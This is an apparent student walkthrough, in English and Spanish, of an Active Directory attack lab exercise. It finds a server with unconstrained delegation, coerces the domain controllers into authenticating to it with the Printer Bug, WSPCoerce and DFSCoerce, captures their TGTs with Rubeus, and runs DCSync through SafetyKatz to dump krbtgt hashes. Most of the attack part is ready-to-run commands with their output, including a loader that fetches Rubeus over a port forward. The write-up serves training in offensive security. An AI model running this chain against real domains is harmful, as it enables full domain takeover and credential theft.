# Learning Objetive 15

* Find a server in the dcorp domain where Unconstrained Delegation is enabled.
* Compromise the server and escalate to Domain Admin privileges.
* Escalate to Enterprise Admins privileges by abusing Printer Bug!

***

> El objetivo es escalar de Domain Admin → Enterprise Admin abusando de una configuración peligrosa llamada Unconstrained Delegation.

First, we need to find a server that has unconstrained delegation enabled:

## Search server with (unconstrained delegation)

```
C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat
. C:\AD\Tools\PowerView.ps1
Get-DomainComputer -Unconstrained | select -ExpandProperty name
```

<figure><img src="../../../.gitbook/assets/image (4) (1).png" alt=""><figcaption></figcaption></figure>

Since the prerequisite for elevation using Unconstrained delegation is having admin access to the machine, we need to compromise a user which has local admin access on appsrv.

> Recall that we extracted secrets of appadmin, srvadmin and websvc from dcorp-adminsrv.

Let’s check if anyone of them have local admin privileges on dcorp-appsrv.

### Check local admins in dcorp-appsrv

> To that, we will need to check all users and hashes previusly obtained
>
> Like for example appadmin

```
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args asktgt /user:appadmin /aes256:68f08715061e4d0790e71b1245bf20b023d08822d2df85bff50a0e8136ffe4cb /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
```

Run the below commands in the new process:

```
C:\Windows\system32> C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat
PS C:\Windows\system32> . C:\AD\Tools\Find-PSRemotingLocalAdminAccess.ps1
PS C:\Windows\system32> Find-PSRemotingLocalAdminAccess -Domain dollarcorp.moneycorp.local
dcorp-appsrv
dcorp-adminsrv
```

Sweet! We now have admin <mark style="background-color:yellow;">access to the machine that has unconstrained delegation.</mark>

### Execute Rubeus using Loader and winrs

Run the below command from the process running appadmin:

```
echo F | xcopy C:\AD\Tools\Loader.exe \\dcorp-appsrv\C$\Users\Public\Loader.exe /Y
```

Run Rubeus in listener mode in the winrs session on dcorp-appsrv:

> Connect to the machine dcorp-appsrv

```
C:\Windows\system32> winrs -r:dcorp-appsrv cmd
```

After obtaining a cmd, do the portforward

```
Microsoft Windows [Version 10.0.20348.1249]
(c) Microsoft Corporation. All rights reserved.

C:\Users\appadmin> netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=172.16.100.53
```

> Remember change the IP
>
> > Remember upload too the Rubeus to us webserver
> >
> > <img src="../../../.gitbook/assets/image (5) (1).png" alt="" data-size="original">

Execute Rubeus

```
C:\Users\appadmin> C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/Rubeus.exe -args monitor /targetuser:DCORP-DC$ /interval:5 /nowrap

  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  V2.2.1

[*] Action: TGT Monitoring
[*] Target user     : DCORP-DC$
[*] Monitoring every 5 seconds for new TGTs
```

> * Deja la ventana de winrs en dcorp-appsrv **abierta** con el monitor de Rubeus corriendo.
> * Abre **otra cmd** en tu máquina student.
> * Ejecuta el comando de Printer Bug de arriba.

### Option 1 - Use the Printer Bug for Coercion

<mark style="background-color:yellow;">On the student VM</mark>, use MS-RPRN to force authentication from dcorp-dc$ (Traffic on TCP port 445 from student VM to dcorp-dc and dcorp-dc to dcorp-appsrv required)

```
C:\AD\Tools> C:\AD\Tools\MS-RPRN.exe \\dcorp-dc.dollarcorp.moneycorp.local \\dcorp-appsrv.dollarcorp.moneycorp.local
RpcRemoteFindFirstPrinterChangeNotificationEx failed.Error Code 1722 - The RPC server is unavailable.
```

### **Option 2 – Windows Search Protocol**

```
C:\AD\Tools\Loader.exe -path C:\AD\Tools\WSPCoerce.exe -args DCORP-DC DCORP-APPSRV
```

### **Option 3 – DFS Namespace**

```
C:\AD\Tools\DFSCoerce-andrea.exe -t dcorp-dc -l dcorp-appsrv
```

### Optain the TGT

After execute some of these options, on the Rubeus listener (dcorp-appsrv), we can see the TGT of dcorp-dc$:

```
[*] Monitoring every 5 seconds for new TGTs

[*] 3/3/2023 5:22:53 PMPM UTC - Found new TGT:

  User                  :  DCORP-DC$@DOLLARCORP.MONEYCORP.LOCAL
  StartTime             :  3/3/2023 2:16:37 AM
  EndTime               :  3/3/2023 12:15:31 PM
  RenewTill             :  3/10/2023 2:15:31 AM
  Flags                 :  name_canonicalize, pre_authent, renewable, forwarded, forwardable
  Base64EncodedTicket   :

    doIFxTCC..

[snip]
```

<figure><img src="../../../.gitbook/assets/image (6) (1).png" alt=""><figcaption></figcaption></figure>

<mark style="background-color:yellow;">Copy the base64 encoded ticket and use it with Rubeus on student VM.</mark>

### Importar the ticket and do DCSync (Domain Admin)

Run the below command from an elevated shell as the SafetyKatz command that we will use for DCSync needs to be run from an elevated process:

```
C:\Windows\system32> C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args ptt /ticket:doIFx…
[snip]
[*] Action: Import Ticket
[+] Ticket successfully imported!
```

> Remember replace the ticket ... to base64 previusly getting

Now, we can run DCSync from this process:

> All it from VM machine

```
C:\Windows\system32> C:\AD\Tools\Loader.exe -path C:\AD\Tools\SafetyKatz.exe -args "lsadump::evasive-dcsync /user:dcorp\krbtgt" "exit"

[snip]

SAM Username         : krbtgt
Account Type         : 30000000 ( USER_OBJECT )
User Account Control : 00000202 ( ACCOUNTDISABLE NORMAL_ACCOUNT )
Account expiration   :
Password last change : 11/11/2022 9:59:41 PM
Object Security ID   : S-1-5-21-719815819-3726368948-3917688648-502
Object Relative ID   : 502

Credentials:
  Hash NTLM: 4e9815869d2090ccfca61c1fe0d23986
    ntlm- 0: 4e9815869d2090ccfca61c1fe0d23986
    lm  - 0: ea03581a1268674a828bde6ab09db837

Supplemental Credentials:
* Primary:NTLM-Strong-NTOWF *
    Random Value : 6d4cc4edd46d8c3d3e59250c91eac2bd

* Primary:Kerberos-Newer-Keys *
    Default Salt : DOLLARCORP.MONEYCORP.LOCALkrbtgt
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : 154cb6624b1d859f7080a6615adc488f09f92843879b3d914cbcb5a8c3cda848
      aes128_hmac       (4096) : e74fa5a9aa05b2c0b2d196e226d8820e

[snip]
```

Great!

## Escalada a Enterprise Admin (repetición contra mcorp-dc)

To get Enterprise Admin privileges, we need to force authentication from `mcorp-dc`.

> Repite los mismos pasos pero ahora contra mcorp-dc$:

Run the below command to listen for `mcorp-dc$` tickets on `dcorp-appsrv`:

```
C:\Windows\system32> winrs -r:dcorp-appsrv cmd
Microsoft Windows [Version 10.0.20348.1249]
(c) Microsoft Corporation. All rights reserved.

C:\Users\appadmin> C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/Rubeus.exe -args monitor /targetuser:MCORP-DC$ /interval:5 /nowrap

C:\Users\Public\Rubeus.exe monitor /targetuser:MCORP-DC$ /interval:5 /nowrap
  ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  V2.2.1

[*] Action: TGT Monitoring
[*] Target user     : MCORP-DC$
[*] Monitoring every 5 seconds for new TGTs
```

Use MS-RPRN on the student VM to trigger authentication from `mcorp-dc` to `dcorp-appsrv`:

```
C:\AD\Tools> C:\AD\Tools\MS-RPRN.exe \\mcorp-dc.moneycorp.local \\dcorp-appsrv.dollarcorp.moneycorp.local
RpcRemoteFindFirstPrinterChangeNotificationEx failed.Error Code 1722 - The RPC server is unavailable.
```

> **Alternatively**, we can also use MS-DFSNM or MS-WSP (note that we are not using FQDN of mcorp-dc in case of WSPCoerce):
>
> ```
> C:\AD\Tools> C:\AD\Tools\DFSCoerce-andrea.exe -t mcorp-dc.moneycorp.local -l dcorp-appsrv.dollarcorp.moneycorp.local
>
> C:\AD\Tools> C:\AD\Tools\Loader.exe -path C:\AD\Tools\WSPCoerce.exe -args mcorp-dc dcorp-appsrv.dollarcorp.moneycorp.local
> ```

On the Rubeus listener, we can see the TGT of mcorp-dc$:

```
[*] Monitoring every 5 seconds for new TGTs

[*] 3/3/2023 5:32:23 PM UTC - Found new TGT:

  User                  :  MCORP-DC$@MONEYCORP.LOCAL

[snip]
```

As previously, copy the base64 encoded ticket and use it with Rubeus on student VM. Run the below command from an elevated shell as the SafetyKatz command that we will use for DCSync needs to be run from an elevated process:

```
C:\Windows\system32> C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args ptt /ticket:doIFx…
[snip]
[*] Action: Import Ticket
[+] Ticket successfully imported!

Now, we can run DCSync from this process:

C:\Windows\system32> C:\AD\Tools\Loader.exe -path C:\AD\Tools\SafetyKatz.exe -args "lsadump::evasive-dcsync /user:mcorp\krbtgt /domain:moneycorp.local" "exit"

[snip]
```

Awesome ! We escalated to Enterprise Admins too!

***

#### Resumen sencillo de lo que has hecho:

1. **Buscaste** qué máquinas tienen **Unconstrained Delegation** → Encontraste dcorp-appsrv (y el DC).
2. **Comprobaste** cuáles de tus usuarios comprometidos (appadmin, srvadmin, websvc) tenían **admin local** en esas máquinas → Encontraste que appadmin es administrador local en dcorp-appsrv.
3. **Comprometiste** dcorp-appsrv usando appadmin.
4. Pusiste un **monitor** (Rubeus) en dcorp-appsrv esperando que llegue un TGT muy valioso.
5. **Forzaste** (usando Printer Bug / WSPCoerce, etc.) que el **Domain Controller** (dcorp-dc$) se autentique contra dcorp-appsrv.
6. Gracias a que dcorp-appsrv tiene **Unconstrained Delegation**, cuando dcorp-dc$ se autenticó, **dejó su TGT completo** en memoria.
7. Robaste ese TGT del dcorp-dc$ y lo usaste para hacer **DCSync** y sacar el hash de krbtgt del dominio dollarcorp.
